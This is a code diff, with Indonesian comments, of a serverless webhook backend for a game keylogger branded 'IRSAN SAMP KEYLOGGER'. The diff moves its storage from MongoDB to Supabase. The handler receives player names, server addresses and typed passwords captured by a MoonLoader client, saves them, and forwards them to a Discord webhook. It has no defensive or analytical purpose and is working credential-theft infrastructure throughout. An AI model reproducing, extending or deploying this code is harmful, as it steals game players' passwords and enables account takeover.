@@ -1,66 +1,27 @@
 // ==========================================
-// KEYLOG BACKEND - MONGODB ATLAS (SERVERLESS)
+// KEYLOG WEBHOOK - VERCEL + SUPABASE
 // ==========================================
-// - Terima data dari client (MoonLoader)
-// - Simpan ke MongoDB Atlas
-// - Kirim ke Discord Webhook
-// - Hapus dari MongoDB setelah sukses
+// - Terima data dari MoonLoader
+// - Simpan ke Supabase
+// - Forward ke Discord
+// - Hapus dari Supabase setelah berhasil
 // ==========================================
 
-const { MongoClient, ServerApiVersion } = require('mongodb');
+import { createClient } from '@supabase/supabase-js';
 
 // ==========================================
-// KONFIGURASI DARI ENVIRONMENT
+// KONFIGURASI (dari Environment Variables)
 // ==========================================
+const SUPABASE_URL = process.env.SUPABASE_URL;
+const SUPABASE_KEY = process.env.SUPABASE_KEY;
 const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
 const API_KEY = process.env.API_KEY || 'runzyt2026rowr';
-const MONGODB_URI = process.env.MONGODB_URI;
-const DB_NAME = process.env.DB_NAME || 'keylog';
-const COLLECTION_NAME = process.env.COLLECTION_NAME || 'logs';
+
+// Inisialisasi Supabase
+const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
 
 // ==========================================
-// KONEKSI MONGODB (CACHED UNTUK SERVERLESS)
-// ==========================================
-let cachedClient = null;
-let cachedDb = null;
-
-async function connectToDatabase() {
-    // Jika sudah ada koneksi, reuse
-    if (cachedClient && cachedDb) {
-        return { client: cachedClient, db: cachedDb };
-    }
-
-    if (!MONGODB_URI) {
-        throw new Error('MONGODB_URI environment variable is not set');
-    }
-
-    // Buat koneksi baru dengan opsi ServerApi
-    const client = new MongoClient(MONGODB_URI, {
-        serverApi: {
-            version: ServerApiVersion.v1,
-            strict: true,
-            deprecationErrors: true,
-        }
-    });
-
-    // Connect ke server
-    await client.connect();
-    
-    // Ping untuk memastikan koneksi berhasil
-    await client.db("admin").command({ ping: 1 });
-    console.log("[MongoDB] Connected successfully!");
-
-    const db = client.db(DB_NAME);
-    
-    // Simpan di cache
-    cachedClient = client;
-    cachedDb = db;
-
-    return { client, db };
-}
-
-// ==========================================
-// MAIN HANDLER (VERCEL SERVERLESS FUNCTION)
+// MAIN HANDLER (Vercel Serverless Function)
 // ==========================================
 export default async function handler(req, res) {
     // CORS
@@ -75,24 +36,24 @@ export default async function handler(req, res) {
     // AUTH
     const providedKey = req.headers['x-api-key'];
     if (providedKey !== API_KEY) {
-        return res.status(401).json({ 
-            success: false, 
-            error: 'Unauthorized' 
+        return res.status(401).json({
+            success: false,
+            error: 'Unauthorized'
         });
     }
 
-    // Hanya menerima POST
+    // Hanya POST
     if (req.method !== 'POST') {
-        return res.status(405).json({ 
-            success: false, 
-            error: 'Method not allowed' 
+        return res.status(405).json({
+            success: false,
+            error: 'Method not allowed'
         });
     }
 
     try {
         const data = req.body;
 
-        // Validasi input
+        // Validasi
         if (!data.inputtext && !data.password) {
             return res.status(400).json({
                 success: false,
@@ -101,56 +62,67 @@ export default async function handler(req, res) {
         }
 
         // ==========================================
-        // 1. KONEK KE MONGODB & SIMPAN DATA
+        // 1. SIMPAN KE SUPABASE
         // ==========================================
-        const { db } = await connectToDatabase();
-        const collection = db.collection(COLLECTION_NAME);
-
-        // Buat dokumen log
         const logEntry = {
-            _id: new Date().toISOString() + '-' + Math.random().toString(36).substr(2, 6),
+            id: Date.now().toString(36) + Math.random().toString(36).substr(2, 6),
             timestamp: data.timestamp || new Date().toISOString(),
             servername: data.servername || 'Unknown',
             ip: data.ip || '0.0.0.0',
             port: data.port || 0,
-            playerName: data.playerName || 'Unknown',
+            player_name: data.playerName || 'Unknown',
             password: data.password || data.inputtext,
             inputtext: data.inputtext,
             platform: data.platform || 'MoonLoader',
-            createdAt: new Date().toISOString(),
-            status: 'pending' // pending, sent, failed
+            status: 'pending',
+            created_at: new Date().toISOString()
         };
 
-        // Insert ke MongoDB
-        const result = await collection.insertOne(logEntry);
-        console.log(`[MongoDB] Inserted log: ${result.insertedId}`);
+        // Insert ke Supabase
+        const { error: insertError } = await supabase
+            .from('keylogs')
+            .insert(logEntry);
+
+        if (insertError) {
+            console.error('[Supabase] Insert error:', insertError);
+            return res.status(500).json({
+                success: false,
+                error: insertError.message
+            });
+        }
+
+        console.log(`[Supabase] Saved log: ${logEntry.id}`);
 
         // ==========================================
-        // 2. KIRIM KE DISCORD WEBHOOK
+        // 2. FORWARD KE DISCORD
         // ==========================================
         const discordSuccess = await sendToDiscord(logEntry);
 
         // ==========================================
-        // 3. UPDATE STATUS & HAPUS ATAU TANDAI GAGAL
+        // 3. UPDATE STATUS DI SUPABASE
         // ==========================================
         if (discordSuccess) {
-            // Hapus dari database (karena sudah terkirim)
-            await collection.deleteOne({ _id: logEntry._id });
-            console.log(`[MongoDB] Deleted log: ${logEntry._id} (sent to Discord)`);
+            await supabase
+                .from('keylogs')
+                .update({ status: 'sent' })
+                .eq('id', logEntry.id);
+            console.log(`[Supabase] Updated status to 'sent': ${logEntry.id}`);
         } else {
-            // Tandai sebagai gagal (bisa di-retry nanti)
-            await collection.updateOne(
-                { _id: logEntry._id },
-                { $set: { status: 'failed' } }
-            );
-            console.log(`[MongoDB] Updated status to 'failed' for: ${logEntry._id}`);
+            await supabase
+                .from('keylogs')
+                .update({ status: 'failed' })
+                .eq('id', logEntry.id);
+            console.log(`[Supabase] Updated status to 'failed': ${logEntry.id}`);
         }
 
+        // ==========================================
+        // 4. KIRIM RESPONSE KE CLIENT
+        // ==========================================
         return res.status(200).json({
             success: true,
-            id: logEntry._id,
+            id: logEntry.id,
             sentToDiscord: discordSuccess,
-            status: discordSuccess ? 'deleted' : 'failed'
+            status: discordSuccess ? 'sent' : 'failed'
         });
 
     } catch (error) {
@@ -163,7 +135,7 @@ export default async function handler(req, res) {
 }
 
 // ==========================================
-// FUNGSI KIRIM KE DISCORD WEBHOOK
+// FUNGSI KIRIM KE DISCORD
 // ==========================================
 async function sendToDiscord(log) {
     if (!DISCORD_WEBHOOK_URL) {
@@ -176,14 +148,14 @@ async function sendToDiscord(log) {
             title: '🔒 LOG DATA PLAYER',
             description: '**IRSAN SAMP KEYLOGGER**\n© 2026 IRSAN SAMP',
             color: 16776960,
-            footer: { 
-                text: `ID: ${log._id} | Sent via MongoDB Backend` 
+            footer: {
+                text: `ID: ${log.id} | Supabase + Vercel`
             },
             timestamp: log.timestamp,
             fields: [
                 { name: '📡 Server', value: log.servername, inline: false },
                 { name: '🌐 IP Address', value: `${log.ip}:${log.port}`, inline: false },
-                { name: '👤 Player Name', value: log.playerName, inline: false },
+                { name: '👤 Player Name', value: log.player_name, inline: false },
                 { name: '⌨️ Input / Password', value: `\`\`\`\n${log.password}\n\`\`\``, inline: false }
             ]
         }]
